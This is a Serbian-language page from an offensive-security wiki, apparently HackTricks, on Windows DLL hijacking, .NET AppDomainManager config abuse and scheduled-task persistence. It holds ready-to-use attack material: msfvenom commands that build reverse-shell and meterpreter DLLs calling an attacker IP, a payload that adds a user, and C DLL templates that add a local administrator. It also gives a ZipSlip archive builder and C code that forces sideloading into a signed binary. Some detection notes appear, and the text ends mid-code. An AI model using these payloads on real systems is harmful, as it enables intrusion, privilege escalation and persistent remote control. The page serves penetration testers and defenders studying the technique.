# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva navođenje pouzdane aplikacije da učita zlonamerni DLL. Ovaj izraz obuhvata nekoliko taktika, kao što su **DLL Spoofing, Injection i Side-Loading**. Uglavnom se koristi za izvršavanje koda i postizanje opstanka, a ređe za eskalaciju privilegija. Iako je ovde naglasak na eskalaciji, način preotimanja ostaje isti bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking koristi se nekoliko metoda, a njihova efikasnost zavisi od načina na koji aplikacija učitava DLL-ove:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zamena legitimnog DLL-a zlonamernim, uz mogućnost korišćenja DLL Proxying-a radi očuvanja funkcionalnosti originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pretrage ispred legitimnog i iskorišćavanje redosleda pretrage koji aplikacija koristi.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji aplikacija učitava misleći da je u pitanju nepostojeći, neophodan DLL.
4. **DLL Redirection**: Izmena parametara pretrage, kao što je `%PATH%`, ili datoteka `.exe.manifest` / `.exe.local` kako bi se aplikacija usmerila ka zlonamernom DLL-u.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim u direktorijumu WinSxS; ovaj metod se često povezuje sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika, zajedno sa kopiranom aplikacijom, što podseća na tehnike Binary Proxy Execution.

Aplikacija može da implementira i **sopstveni DLL loader**. Proces sa povišenim privilegijama može da pretraži podređeni direktorijum, kao što su `Libraries` ili `Plugins`, i prosledi izabrani DLL pomoćnom procesu, nezavisno od uobičajenog redosleda pretrage DLL-ova u Windows-u. Ako drugi nalog može da kreira datoteke u tom konkretnom direktorijumu, tretirajte to kao povod za proveru: potvrdite identitet procesa, efektivni ACL direktorijuma, pravilo za izbor datoteke i mogućnost da se učitavanje zaista dogodi. To što je direktorijum pored izvršne datoteke upisiv ne dokazuje da proces iz njega učitava DLL-ove.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasični DLL sideloading nije jedini način da se pouzdanom procesu **.NET Framework**-a omogući učitavanje koda napadača. Ako je ciljna izvršna datoteka **managed** aplikacija, CLR takođe proverava **konfiguracionu datoteku aplikacije** nazvanu prema izvršnoj datoteci (na primer `Setup.exe.config`). Ta datoteka može da definiše prilagođeni **AppDomainManager**. Ako konfiguracija upućuje na assembly pod kontrolom napadača, postavljen pored EXE datoteke, CLR ga učitava **pre uobičajenog toka izvršavanja aplikacije** i pokreće unutar pouzdanog procesa.<sup>[[24]](#references)</sup>

Prema Microsoft-ovoj konfiguracionoj šemi za .NET Framework, oba elementa — `<appDomainManagerAssembly>` i `<appDomainManagerType>` — moraju biti prisutna da bi se koristio prilagođeni manager.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracija:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalni menadžer:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Zasniva se na parsiranju CLR konfiguracije, a ne na redosledu pretrage Win32 DLL-ova.
- Host zaista mora biti **managed EXE**. Brza provera: `sigcheck -m target.exe`, `corflags target.exe` ili potražite **CLR Runtime Header** u PE metapodacima.
- Naziv konfiguracione datoteke mora se tačno poklapati sa nazivom izvršne datoteke (`<binary>.config`) i obično se nalazi **pored EXE datoteke**.
- Ovo je korisno uz **potpisane Microsoft/vendor binarne datoteke**, jer pouzdani EXE ostaje neizmenjen dok se zlonamerni managed assembly izvršava u istom procesu.
- Ako već imate direktorijum za instalaciju/ažuriranje u koji možete da upisujete, AppDomainManager hijacking može da posluži kao **prva faza**, nakon koje slede klasični DLL sideloading ili reflective loading za kasnije faze.

### AppDomainManager kao downloader + pokretač zakazanog zadatka

Praktičan obrazac upada je uparivanje pouzdanog managed EXE-a sa zlonamernim `*.config` fajlom i zlonamernom AppDomainManager DLL datotekom koja služi samo kao **mali bootstrapper**:<sup>[[25]](#references)</sup>

1. Korisnik pokreće potpisani .NET instalacioni program ili alat za ažuriranje sa uverljive lokacije, kao što je `%USERPROFILE%\Downloads`.
2. Pridruženi config navodi CLR da učita napadačev assembly **pre nego što počne logika legitimne aplikacije**.
3. Zlonamerni manager sprovodi **path gate** (na primer, nastavlja samo ako se host EXE pokreće iz `Downloads`, a druga faza se pokreće samo iz `%LOCALAPPDATA%`).
4. Ako provera prođe, preuzima stvarni payload u putanju u koju korisnik može da upisuje, na primer `%LOCALAPPDATA%\PerfWatson2.exe`, и uspostavlja persistence pomoću zakazanog zadatka.

Zašto je ova varijanta važna:
- Potpisani host EXE ostaje neizmenjen, pa analiza koja proverava samo hash glavne binarne datoteke može da propusti kompromitaciju.
- Jednostavna **path-based anti-analysis** tehnika je česta: premeštanje trojke ZIP/EXE/DLL na Desktop, u Temp ili na putanju sandboxa može namerno da prekine lanac.
- AppDomainManager DLL prve faze može da ostane mala i neupadljiva, dok se pravi implant preuzima kasnije.

Minimalni primer persistence-a koji se često viđa u ovom obrascu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Napomene:
- ` /rl highest` znači **najviši dostupni nivo** za tog korisnika/sesiju; sam po sebi ne garantuje eskalaciju do SYSTEM.
- Ovu tehniku je često prikladnije kategorizovati kao **izvršavanje/persistenciju zloupotrebom .NET konfiguracije** nego kao klasični hijacking redosleda pretrage za nedostajuću DLL datoteku, iako operateri često kombinuju obe tehnike.

Indikatori za detekciju:
- Potpisani .NET izvršni fajlovi pokrenuti iz putanja za **raspakivanje ZIP arhiva**, `Downloads`, `%TEMP%` ili drugih fascikli u koje korisnik može da upisuje, uz pridruženu datoteku `<exe>.config`.
- Novi scheduled task-ovi čija radnja upućuje na `%LOCALAPPDATA%`, `%APPDATA%` ili `Downloads`, a čija imena podražavaju programe za ažuriranje pregledača/proizvođača.
- Kratkotrajni managed bootstrap procesi koji odmah preuzimaju drugi EXE, a zatim pokreću `schtasks.exe`.
- Uzorci koji se rano zatvaraju osim ako se putanja izvršnog fajla ne poklapa sa očekivanom putanjom korisničkog profila.

### Hijacking postojećeg scheduled task-a za ponovno pokretanje sideload lanca

Radi persistencije, nemojte tražiti samo **kreiranje novog task-a**. Neke grupe napadača čekaju da legitimni instalacioni program napravi **uobičajeni task za ažuriranje**, a zatim **prepravljaju radnju task-a** tako da poznati naziv, autor i okidač ostanu nepromenjeni i neupadljivi za branioce.

Ponovljiv postupak:
1. Instalirajte/pokrenite legitimni softver i utvrdite koji task obično kreira.
2. Izvezite XML task-a i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zamenite samo radnju tako da task pokreće vaš **pouzdani host EXE** iz privremene fascikle u koju korisnik može da upisuje; taj EXE zatim učitava stvarni payload putem sideload-a ili AppDomain-a.
4. Ponovo registrujte isti naziv task-a umesto da kreirate novi, upadljiv artefakt persistencije.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Zašto je prikrivenije:
- Naziv zadatka i dalje može delovati legitimno (na primer, kao alat za ažuriranje proizvođača).
- Pokreće ga **Task Scheduler service**, pa provera roditeljskog procesa ili predaka često vidi očekivani lanac pokretanja preko raspoređivača, umesto `explorer.exe`.
- DFIR timovi koji traže samo **nove nazive zadataka** mogu prevideti zadatak koji je već bio registrovan, ali čija radnja sada upućuje na `%LOCALAPPDATA%`, `%APPDATA%` ili neku drugu putanju pod kontrolom napadača.

Brze tačke za pretragu:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite XML datoteke u `C:\Windows\System32\Tasks\*` i metapodatke u `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` sa osnovnim stanjem.
- Generišite upozorenje kada se **zadatak za ažuriranje koji deluje kao da pripada proizvođaču** pokreće iz **direktorijuma u koje korisnik može da upisuje** ili pokreće .NET EXE sa pratećom datotekom `*.config`.

> [!TIP]
> Za lanac koraka koji kombinuje HTML staging, AES-CTR konfiguracije i .NET implantate sa DLL sideloading-om, pogledajte sledeći postupak.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje DLL-ova koji nedostaju

Najčešći način da pronađete DLL-ove koji nedostaju u sistemu jeste da pokrenete [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals paketa i **podesite sledeća 2 filtera**:

![Common Techniques - Finding missing Dlls: Najčešći način da pronađete DLL-ove koji nedostaju u sistemu jeste da pokrenete procmon iz sysinternals paketa i podesite sledeća 2 filtera](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Najčešći način da pronađete DLL-ove koji nedostaju u sistemu jeste da pokrenete procmon iz sysinternals paketa i podesite sledeća 2 filtera](<../../../images/image (230).png>)

i prikažete samo **File System Activity**:

![Common Techniques - Finding missing Dlls: i prikažete samo File System Activity](<../../../images/image (153).png>)

Ako tražite **DLL-ove koji nedostaju uopšte**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **DLL koji nedostaje u određenom izvršnom fajlu**, podesite još jedan filter, kao što je **"Process Name" "contains" `<exec name>`**, pokrenite ga i zaustavite snimanje događaja.<sup>[[9]](#references)</sup>

## Iskorišćavanje DLL-ova koji nedostaju

Da biste eskalirali privilegije, potražite **DLL koji privilegovani proces pokušava da učita** sa lokacije u koju možete da upisujete. Do toga može doći kada kontrolišete direktorijum koji se pretražuje pre direktorijuma sa legitimnim DLL-om ili kada traženi DLL ne postoji, a možete da upisujete u neki od pretraživanih direktorijuma.

### Redosled pretrage DLL-ova

**U** [**Microsoft dokumentaciji**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se DLL-ovi konkretno učitavaju.**

**Windows aplikacije** traže DLL-ove koristeći skup **unapred definisanih putanja za pretragu**, prema određenom redosledu. Do DLL hijacking-a dolazi kada se zlonamerni DLL strateški smesti u jedan od tih direktorijuma kako bi se učitao pre autentičnog DLL-a. Jedan od načina da se to spreči jeste da aplikacija koristi apsolutne putanje prilikom navođenja potrebnih DLL-ova.

Ispod možete videti **redosled pretrage DLL-ova na 32-bitnim** sistemima:

1. Direktorijum iz kog je aplikacija učitana.
2. Sistemski direktorijum. Koristite funkciju [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) da biste dobili putanju do ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bitni sistemski direktorijum. Ne postoji funkcija za dobijanje putanje do ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite funkciju [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) da biste dobili putanju do ovog direktorijuma.
   1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u promenljivoj okruženja PATH. Imajte na umu da ovo ne obuhvata putanju za pojedinačnu aplikaciju navedenu u registry ključu **App Paths**. Ključ **App Paths** se ne koristi pri izračunavanju putanje za pretragu DLL-ova.

Ovo je **podrazumevani** redosled pretrage kada je **SafeDllSearchMode** uključen. Kada je isključen, trenutni direktorijum se pomera na drugo mesto. Da biste isključili ovu funkciju, napravite vrednost registry-ja **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je uključena).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

DLL se može učitati i navođenjem apsolutne putanje umesto imena. U tom slučaju Windows traži sam DLL samo na toj putanji; zavisnosti navedene imenom i dalje prate odgovarajući redosled pretrage.

Postoje i drugi načini za izmenu redosleda pretrage, ali ih ovde neću objašnjavati.

### Povezivanje proizvoljnog upisa datoteke sa DLL hijacking-om zbog DLL-a koji nedostaje

**Povezana tehnika:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Koristite **ProcMon** filtere (`Process Name` = ciljni EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) da biste prikupili nazive DLL-ova koje proces traži, ali ne uspeva da pronađe.<sup>[[14]](#references)</sup>
2. Ako se binarni fajl pokreće **po rasporedu/kao servis**, DLL sa jednim od tih naziva, smešten u **direktorijum aplikacije** (prva stavka redosleda pretrage), biće učitan pri sledećem pokretanju. U jednom slučaju sa .NET skenerom, proces je tražio `hostfxr.dll` u `C:\samples\app\` pre nego što je učitao pravu kopiju iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite DLL sa payload-om (npr. reverse shell) i bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitive **proizvoljan upis u stilu ZipSlip**, napravite ZIP čija stavka izlazi iz direktorijuma za raspakivanje, tako da DLL završi u direktorijumu aplikacije:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Isporučite arhivu u nadgledani inbox/share; kada zakazani zadatak ponovo pokrene proces, on učitava zlonamerni DLL i izvršava vaš kod kao nalog servisa.

### Forsiranje sideloading-a preko RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način za deterministički uticaj na putanju pretrage DLL-a novokreiranog procesa jeste postavljanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću ntdll-ovih izvornih API-ja. Ako ovde navedete direktorijum pod kontrolom napadača, ciljni proces koji razrešava naziv uvezenog DLL-a (bez apsolutne putanje i bez korišćenja bezbednih zastavica za učitavanje) može biti primoran da učita zlonamerni DLL iz tog direktorijuma.

Ključna ideja
- Napravite parametre procesa pomoću RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji upućuje na fasciklu pod vašom kontrolom (npr. direktorijum u kome se nalazi vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljni binarni fajl razrešava naziv DLL-a, loader će tokom razrešavanja proveriti navedeni DllPath, što omogućava pouzdan sideloading čak i kada zlonamerni DLL nije u istom direktorijumu kao ciljni EXE.

Napomene/ograničenja
- Ovo utiče na proces koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Cilj mora da uveze DLL ili da pozove LoadLibrary za DLL po nazivu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje ne mogu se hijackovati. Prosleđeni export-i i SxS mogu da promene redosled prioriteta.

Minimalni C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>C primer u celosti: forsiranje DLL sideloading-a preko RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Primer operativne upotrebe
- Postavite zlonamerni xmllite.dll (koji izvozi neophodne funkcije ili prosleđuje pozive pravoj biblioteci) u svoj DllPath direktorijum.
- Pokrenite potpisani binarni fajl za koji se zna da pomoću gorenavedene tehnike traži xmllite.dll po imenu. Loader razrešava import preko navedenog DllPath-a i učitava vašu DLL bibliotеку sa strane.

Primećeno je da se ova tehnika koristi u stvarnim napadima za pokretanje višestepenih lanaca učitavanja sa strane: početni pokretač ispušta pomoćnu DLL biblioteku, koja zatim pokreće Microsoft-om potpisani binarni fajl podložan hijackingu, sa prilagođenim DllPath-om kako bi se nametnulo učitavanje napadačeve DLL biblioteke iz direktorijuma za pripremu.<sup>[[6]](#references)</sup>


### Hijacking .NET AppDomainManager-a preko `.exe.config`

Za mete koje koriste **.NET Framework**, učitavanje sa strane može se obaviti **pre funkcije `Main()`**, bez izmene memorije, zloupotrebom susedne datoteke **`.exe.config`** aplikacije. Umesto oslanjanja isključivo na redosled pretrage Win32 DLL-ova, napadač postavlja legitimnu .NET EXE datoteku pored zlonamerne konfiguracije i jednog ili više sklopova pod kontrolom napadača.

Kako funkcioniše lanac:<sup>[[15]](#references)[[22]](#references)</sup>
1. EXE datoteka domaćin se pokreće, a **CLR čita `<exe>.config`**.
2. Konfiguracija postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, tako da runtime instancira `AppDomainManager` pod kontrolom napadača.
3. Zlonamerni upravljač dobija mogućnost **izvršavanja pre funkcije `Main()`** unutar procesa pouzdanog domaćina.
4. Ista konfiguracija može primorati CLR da prvo razrešava lokalne sklopove (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i može oslabiti validaciju runtime-a i telemetriju bez inline patching-a.

Obrazac nalik kampanji (tačno ugnježđivanje može da varira u zavisnosti od direktive / verzije CLR-a):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Zašto je ovo korisno:
- **`<probing privatePath="."/>`** zadržava razrešavanje assembly-ja u direktorijumu aplikacije, pretvarajući taj direktorijum u predvidljivu površinu za sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** preusmeravaju izvršavanje na kod napadača tokom inicijalizacije CLR-a, pre nego što se pokrene legitimna logika aplikacije.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može omogućiti aplikaciji sa full-trust privilegijama da učita nepotpisane ili izmenjene assembly-je bez greške pri validaciji strong-name potpisa.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** sprečava preusmeravanja publisher-policy-ja ka novijim assembly-jima.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** čini izbor runtime-a predvidljivijim.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** posebno je zanimljiv jer **CLR isključuje sopstvenu ETW vidljivost** putem konfiguracije, umesto da implant zakrpi `EtwEventWrite` u memoriji.

Operativni obrazac uočen u nedavnim kampanjama:
- Faza 1 prebacuje `setup.exe`, `setup.exe.config` i lokalne assembly-je.
- Faza 2 ih kopira u uverljiv direktorijum za **AppData ažuriranje**, preimenuje host u nešto poput `update.exe` i ponovo ga pokreće putem **scheduled task-a**.
- Faza 3 proverava kontekst izvršavanja (na primer, da li je očekivani roditeljski proces `svchost.exe` koji je pokrenuo Task Scheduler) pre učitavanja konačnog RAT DLL/export-a.

Ideje za lov na pretnje:
- Potpisani ili na drugi način legitimni **.NET executable-i** koji se pokreću uz sumnjive susedne **`.config`** datoteke na lokacijama u koje korisnik može da upisuje.
- `.config` datoteke koje sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ili **`etwEnable enabled="false"`**.
- Scheduled task-ovi koji ponovo pokreću preimenovane update binarne datoteke iz direktorijuma **`%LOCALAPPDATA%`** ili direktorijuma specifičnih za aplikaciju, kao što je `\bin\update\`.
- Lanci roditeljskih/podređenih procesa u kojima scheduled task pokreće pouzdan .NET host koji odmah učitava assembly-je koji nisu od proizvođača iz sopstvenog direktorijuma.

#### Izuzeci u redosledu pretrage DLL-a navedeni u Windows dokumentaciji

Windows dokumentacija navodi određene izuzetke od standardnog redosleda pretrage DLL-a:

- Kada se naiđe na **DLL koji ima isto ime kao DLL koji je već učitan u memoriju**, sistem zaobilazi uobičajenu pretragu. Umesto toga, proverava preusmeravanje i manifest, a zatim, ako ih nema, koristi DLL koji je već u memoriji. **U ovom slučaju sistem ne pretražuje DLL**.
- Ako je DLL prepoznat kao **poznat DLL** za trenutnu verziju Windows-a, sistem koristi svoju verziju poznatog DLL-a, zajedno sa svim njegovim zavisnim DLL-ovima, **preskačući pretragu**. Registarski ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga tih zavisnih DLL-ova obavlja se kao da su navedeni samo njihovi **nazivi modula**, bez obzira na to da li je početni DLL pronađen korišćenjem pune putanje.

### Eskalacija privilegija

**Zahtevi**:

- Pronađite proces koji radi ili će raditi sa **drugačijim privilegijama** (horizontalno ili lateralno kretanje), a kome **nedostaje DLL**.
- Obezbedite **pristup za upisivanje** u bilo koji **direktorijum** u kojem će se **DLL** tražiti. To može biti direktorijum izvršne datoteke ili direktorijum unutar sistemske putanje.

Ovi preduslovi nisu uobičajeni podrazumevano: privilegovanim izvršnim datotekama obično ne nedostaju zavisni DLL-ovi, a standardni korisnici uglavnom ne mogu da upisuju u direktorijume sistemske putanje za pretragu. Ipak, pogrešno konfigurisana okruženja mogu izložiti oba uslova.\
Ako su zahtevi ispunjeni, proverite projekat [UACME](https://github.com/hfiref0x/UACME). Iako mu je glavni cilj UAC bypass, sadrži PoC-ove za DLL hijacking za određene verzije Windows-a, koje se često mogu prilagoditi direktorijumu u koji možete da upisujete.

Imajte na umu da možete **proveriti svoje dozvole u fascikli** pomoću:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

I **proverite dozvole svih fascikli unutar PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Takođe možete proveriti importe izvršne datoteke i eksporte DLL-a pomoću:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Za kompletan vodič o tome kako **zloupotrebiti DLL Hijacking za eskalaciju privilegija** uz dozvole za pisanje u fasciklu **System Path**, pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)proverava da li imate dozvole za pisanje u neku fasciklu unutar system PATH-a.\
Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

Ako pronađete scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešno iskorišćavanje jeste da **napravite dll koji eksportuje bar sve funkcije koje će izvršna datoteka uvoziti iz njega**. U svakom slučaju, imajte na umu da je DLL Hijacking koristan za [**eskalaciju sa nivoa Medium Integrity na High (zaobilaženjem UAC-a)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **pravljenja ispravnog dll-a** možete pronaći u ovoj studiji DLL hijacking-a usmerenoj na izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **sledećem odeljk**u možete pronaći nekoliko **osnovnih dll kodova** koji mogu biti korisni kao **šabloni** ili za pravljenje **dll-a sa eksportovanim funkcijama koje nisu obavezne**.

## **Pravljenje i kompajliranje DLL-ova**

### **DLL proxy**

U osnovi, **DLL proxy** je DLL koji može da **izvrši vaš zlonamerni kod kada se učita**, ali i da **izlaže funkcije** i **radi** onako kako se **očekuje**, tako što **prosleđuje sve pozive pravoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete **navesti izvršnu datoteku i izabrati biblioteku** za koju želite da napravite proxy, a zatim **generisati dll proxy**, ili **navesti DLL** i **generisati dll proxy**.

### **Meterpreter**

**Nabavite rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Nabavite meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Kreirajte korisnika (x86, nisam video x64 verziju):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Vaš sopstveni

U mnogim slučajevima, DLL koji kompajlirate mora da **eksportuje svaku funkciju koju uvozi victim process**. Ako nedostaje neki obavezni export, binary ne može da ga razreši i exploit ne uspeva.

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
